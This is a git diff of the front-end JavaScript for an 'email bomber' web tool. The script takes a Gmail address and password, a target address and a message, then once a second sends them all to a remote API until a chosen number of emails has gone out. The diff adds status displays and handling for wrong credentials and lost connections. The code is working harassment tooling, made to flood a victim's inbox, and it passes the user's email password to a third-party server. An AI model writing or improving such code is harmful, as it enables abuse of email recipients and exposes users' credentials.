@@ -1,3 +1,8 @@
+/*
+* Author: Fazle Rabbi
+* Date: 4 Feb, 2023
+*/
+
 const startBtn = document.querySelector(".start-btn");
 // form already declare in app.js
 const name_input = document.querySelector(".name");
@@ -15,6 +20,7 @@ const loading = document.querySelector(".loading");
 const emailStatus = document.querySelector(".email-status");
 const bombingStatus = document.querySelector(".bombing-status");
 const totalEmailNumber = document.querySelector(".total-email-number");
+const modalBoxTitle = document.querySelector(".modal-box-title");
 
 // Get form data from localStorage for autocomplete form
 form_data = JSON.parse(localStorage.getItem("form_data"));
@@ -47,6 +53,7 @@ form.addEventListener("submit", function(e){
 	});
 	localStorage.setItem("form_data",data);
 	
+	modalBoxTitle.innerHTML = "Bombing Started"
 	modalContainer.style.opacity = 1;
 	modalContainer.style.pointerEvents = "auto";
 	totalEmailNumber.innerHTML = amount;
@@ -65,35 +72,41 @@ function start_interval(name,gmail,password,target,subject,message,amount){
 	let i = 0;
 	interval = setInterval(function() {
 		i++;
-		if(i > amount_input.value){
-			// Bombing Complete Hers
+		if(i == amount_input.value){
+			// alert("finish")
+			// Bombing Complete Here
 			clearInterval(interval);
-			bombingStatus.innerHTML = "Completed";
-			emailStatus.innerHTML = "All email sent successful";
-			loading.setAttribute("src",tick_image);
-			loading.setAttribute("alt","Finish...");
+			// bombingStatus.innerHTML = "Completed";
+			// emailStatus.innerHTML = "All email sent successful";
+			// loading.setAttribute("src",tick_image);
+			// loading.setAttribute("alt","Finish...");
 		}
-		else{
+		// else{
 			// Bombing Started Here
 			bombingStatus.innerHTML = "Started";
-			emailStatus.innerHTML = `${i} Email sent successful`;
+			// emailStatus.innerHTML = `${i} Email sent successful`;
 			loading.setAttribute("src",loader_image);
 			loading.setAttribute("alt","Loading...");
 			emailStatus.style.display = "block";
 			send_email(name,gmail,password,target,subject,message,amount);
-		}
+		// }
 	}, 1000);
 }
 
 // Stop bombing by clicking on Stop-Bombing Button
 stopBtn.addEventListener("click", ()=>{
+	toast = document.querySelector(".toast");
+	toast.style.opacity = 1;
+	setTimeout(function() {
+		toast.style.opacity = 0;
+	}, 2000);
 	clearInterval(interval);
 	modalContainer.style.opacity = 0;
 	modalContainer.style.pointerEvents = "none";
 	interval = null;
 	setTimeout(function() {
 		bombingStatus.innerHTML = "Started";
-		emailStatus.innerHTML = ""
+		emailStatus.innerHTML = "";
 		loading.setAttribute("src",loader_image);
 		loading.setAttribute("alt","Loading...");
 		emailStatus.style.display = "none";
@@ -104,15 +117,12 @@ stopBtn.addEventListener("click", ()=>{
 // Send Email Function
 const url = "https://fr-api.up.railway.app/api/gmail/send-mail";
 // const url = "http://127.0.0.1:5000/api/gmail/send-mail";
+let i = 0;
+let isBombingStopped = null;
 function send_email(name,gmail,password,target,subject,message,amount){
-	// alert(name)
-	
 	fetch(url, {
 	  method: 'POST',
 	  body: JSON.stringify({
-	    //title: 'foo',
-	    //body: 'bar',
-	    //userId: 1,
 	    name,
 	    gmail,
 	    password,
@@ -125,7 +135,49 @@ function send_email(name,gmail,password,target,subject,message,amount){
 	  },
 	})
 	  .then((response) => response.json())
-	  .then((json) => alert("SUCCESS: "+ JSON.stringify(json)))
-	  .catch((err)=>alert("ERROR: "+err));	
+	  .then((json) => {
+			i++;
+			if(i == amount){
+			   // Bombing Complete Here
+				//clearInterval(interval);
+				bombingStatus.innerHTML = "Completed";
+				emailStatus.innerHTML = "All email sent successful";
+				// alert("stopped");
+				loading.setAttribute("src",tick_image);
+				loading.setAttribute("alt","Finish...");
+				i = 0;
+				return;
+			}
+			// When email successfuly sent
+			if(json.message.includes("succussful")){
+				modalBoxTitle.innerHTML = "Bombing Started"
+				emailStatus.innerHTML = `${i} Email sent successful`;
+				loading.setAttribute("src",loader_image);
+			}
+			// when email not sent due to invalid credential
+			if(json.message.includes("wrong")){
+				// alert(json.message)
+				modalBoxTitle.innerHTML = "Wrong Credentials"
+				error_image = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSd6zi69_FOH662jtvyqhAj9SZXrKMqm0KOhg&usqp=CAU"
+				loading.setAttribute("src",error_image);
+				// stop bombing so that, not complete the bombing
+				isBombingStopped = true;
+				clearInterval(interval);
+				emailStatus.innerHTML = "Oops!You have entered wrong credentials.Please provide current credentials."
+				i = 0;
+			}
+	  })
+	  // No Internet Error
+	  .catch((err)=>{
+	     	// alert("ERROR: "+err);
+	     	modalBoxTitle.innerHTML = "No Internet"
+	     	error_image = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSd6zi69_FOH662jtvyqhAj9SZXrKMqm0KOhg&usqp=CAU"
+	     	loading.setAttribute("src",error_image);
+	     	// stop bombing so that, not complete the bombing
+	     	isBombingStopped = true;
+	     	clearInterval(interval);
+	     	emailStatus.innerHTML = "Oops!Looks like you have no internet.Please check your internet connection and try again."
+	     	i = 0;
+	  });	
 	
 }
